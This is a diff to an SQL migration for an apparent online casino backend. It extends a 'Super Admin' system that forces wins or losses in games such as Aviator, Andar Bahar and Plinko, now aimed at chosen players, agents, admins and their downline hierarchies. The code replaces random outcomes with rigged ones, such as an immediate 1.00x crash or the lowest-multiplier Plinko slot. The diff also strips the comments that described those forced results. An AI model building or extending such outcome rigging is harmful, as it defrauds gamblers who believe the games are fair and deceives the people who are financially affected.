@@ -2,7 +2,8 @@
 -- Gives Super Admin full master command over game outcomes:
 --   • Master Global Switch: Fair (Normal RNG), Force Win (Favor Players), Force Loss (100% House Win).
 --   • Per-Game Outcome Mode: Customize specific games (Aviator, Dragon Tiger, Roulette, Andar Bahar, Lucky 7, Plinko, Blackjack, etc.).
---   • Per-Player Target Control: Super Admin can target specific players to always win or always lose.
+--   • Target Account Control: Target specific Players, Agents, or Admins to always win or always lose.
+--     (Setting an Agent or Admin applies to all players in their downline hierarchy).
 -- Safe to run more than once. Run in the Supabase SQL Editor.
 
 -- Helper to retrieve the active outcome mode for a player and game:
@@ -10,7 +11,7 @@
 create or replace function public.get_outcome_mode(p_user_id uuid, p_game text) returns text
 language plpgsql stable security definer set search_path = public as $$
 declare
-  player_mode text;
+  target_mode text;
   game_mode text;
   global_mode text;
   ctrl jsonb;
@@ -18,11 +19,32 @@ declare
 begin
   select value into ctrl from app_settings where key = 'outcome_control';
 
-  -- 1. Check player-specific target override
+  -- 1. Check direct account or hierarchy override (Player -> Agent -> Admin)
   if ctrl is not null and p_user_id is not null then
-    player_mode := ctrl -> 'players' ->> p_user_id::text;
-    if player_mode in ('force_win', 'force_loss') then
-      return player_mode;
+    with recursive up as (
+      select id, parent_id, 1 as depth from profiles where id = p_user_id
+      union all
+      select p.id, p.parent_id, up.depth + 1 from profiles p join up on p.id = up.parent_id
+    )
+    select 
+      coalesce(
+        ctrl -> 'players' ->> up.id::text,
+        ctrl -> 'agents' ->> up.id::text,
+        ctrl -> 'admins' ->> up.id::text,
+        ctrl -> 'accounts' ->> up.id::text
+      ) into target_mode
+    from up
+    where coalesce(
+        ctrl -> 'players' ->> up.id::text,
+        ctrl -> 'agents' ->> up.id::text,
+        ctrl -> 'admins' ->> up.id::text,
+        ctrl -> 'accounts' ->> up.id::text
+      ) in ('force_win', 'force_loss')
+    order by depth asc
+    limit 1;
+
+    if target_mode in ('force_win', 'force_loss') then
+      return target_mode;
     end if;
   end if;
 
@@ -56,7 +78,7 @@ $$;
 -- Get current outcome control configuration
 create or replace function public.get_outcome_control() returns jsonb
 language sql stable security definer set search_path = public as $$
-  select coalesce((select value from app_settings where key = 'outcome_control'), '{"global_mode":"fair","games":{},"players":{}}'::jsonb);
+  select coalesce((select value from app_settings where key = 'outcome_control'), '{"global_mode":"fair","games":{},"players":{},"agents":{},"admins":{}}'::jsonb);
 $$;
 
 -- Super Admin: Set outcome control
@@ -64,6 +86,10 @@ create or replace function public.set_outcome_control(
   p_global_mode text default null,
   p_game text default null,
   p_game_mode text default null,
+  p_account uuid default null,
+  p_account_mode text default null,
+  p_clear_account uuid default null,
+  p_role text default null,
   p_player uuid default null,
   p_player_mode text default null,
   p_clear_player uuid default null
@@ -74,6 +100,10 @@ declare
   new jsonb := old;
   valid_modes text[] := array['fair', 'force_win', 'force_loss'];
   gid text;
+  target_id uuid := coalesce(p_account, p_player);
+  target_mode text := coalesce(p_account_mode, p_player_mode);
+  clear_id uuid := coalesce(p_clear_account, p_clear_player);
+  r text := p_role;
 begin
   if not public.is_superadmin() then raise exception 'Only Super Admin can control game outcomes'; end if;
 
@@ -89,16 +119,22 @@ begin
     new := jsonb_set(new, array['games', gid], to_jsonb(p_game_mode));
   end if;
 
-  if p_player is not null and p_player_mode is not null then
-    if not (p_player_mode = any(valid_modes)) then raise exception 'Invalid player mode'; end if;
-    if not (new ? 'players') then new := jsonb_set(new, '{players}', '{}'::jsonb); end if;
-    new := jsonb_set(new, array['players', p_player::text], to_jsonb(p_player_mode));
+  if target_id is not null and target_mode is not null then
+    if not (target_mode = any(valid_modes)) then raise exception 'Invalid outcome mode'; end if;
+    if r is null or r not in ('players', 'agents', 'admins') then
+      select case role when 'agent' then 'agents' when 'admin' then 'admins' else 'players' end into r
+      from profiles where id = target_id;
+      if r is null then r := 'players'; end if;
+    end if;
+    if not (new ? r) then new := jsonb_set(new, array[r], '{}'::jsonb); end if;
+    new := jsonb_set(new, array[r, target_id::text], to_jsonb(target_mode));
   end if;
 
-  if p_clear_player is not null then
-    if (new ? 'players') then
-      new := jsonb_set(new, '{players}', (new -> 'players') - p_clear_player::text);
-    end if;
+  if clear_id is not null then
+    if (new ? 'players') then new := jsonb_set(new, '{players}', (new -> 'players') - clear_id::text); end if;
+    if (new ? 'agents') then new := jsonb_set(new, '{agents}', (new -> 'agents') - clear_id::text); end if;
+    if (new ? 'admins') then new := jsonb_set(new, '{admins}', (new -> 'admins') - clear_id::text); end if;
+    if (new ? 'accounts') then new := jsonb_set(new, '{accounts}', (new -> 'accounts') - clear_id::text); end if;
   end if;
 
   insert into app_settings (key, value) values ('outcome_control', new)
@@ -179,7 +215,6 @@ declare
   joker jsonb; andar jsonb := '[]'; bahar jsonb := '[]'; side text := 'andar'; c jsonb; i int := 1;
   note text;
   mode text;
-  -- Outcome optimization variables
   best_pay numeric;
   cand_pay numeric;
   cand_c0 jsonb;
@@ -286,7 +321,6 @@ begin
     end if;
 
   else
-    -- Andar Bahar: centre joker, deal alternately (Andar first) until a card matches joker rank.
     joker := d -> 0;
     if mode in ('force_loss', 'force_win') then
       for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
@@ -369,10 +403,8 @@ begin
   if r.id is null or now() > r.crash_at + interval '3 seconds' then
     mode := public.get_outcome_mode(null, 'aviator');
     if mode = 'force_loss' then
-      -- Plane crashes immediately: 1.00x - 1.04x (100% House win)
       c := round(greatest(1.00, 1.00 + (random() * 0.04)::numeric), 2);
     elsif mode = 'force_win' then
-      -- Plane flies high: 15.00x - 45.00x (Generous Player win)
       c := round((15.00 + (random() * 30.0)::numeric), 2);
     else
       u := random();
@@ -473,9 +505,9 @@ begin
 
   mode := public.get_outcome_mode(me.id, 'plinko');
   if mode = 'force_loss' then
-    target_slot := p_rows / 2; -- lowest multiplier center slot
+    target_slot := p_rows / 2;
   elsif mode = 'force_win' then
-    target_slot := case when random() < 0.5 then 1 else p_rows - 1 end; -- high multiplier outer slot
+    target_slot := case when random() < 0.5 then 1 else p_rows - 1 end;
   else
     target_slot := null;
   end if;
@@ -597,5 +629,8 @@ $$;
 revoke execute on function public.get_outcome_mode(uuid, text) from public, anon, authenticated;
 grant execute on function public.get_outcome_mode(uuid, text) to authenticated, service_role;
 
-revoke execute on function public.get_outcome_control(), public.set_outcome_control(text, text, text, uuid, text, uuid) from public, anon;
-grant execute on function public.get_outcome_control(), public.set_outcome_control(text, text, text, uuid, text, uuid) to authenticated, service_role;
+revoke execute on function public.get_outcome_control() from public, anon;
+grant execute on function public.get_outcome_control() to authenticated, service_role;
+
+revoke execute on function public.set_outcome_control(text, text, text, uuid, text, uuid, text, uuid, text, uuid) from public, anon;
+grant execute on function public.set_outcome_control(text, text, text, uuid, text, uuid, text, uuid, text, uuid) to authenticated, service_role;
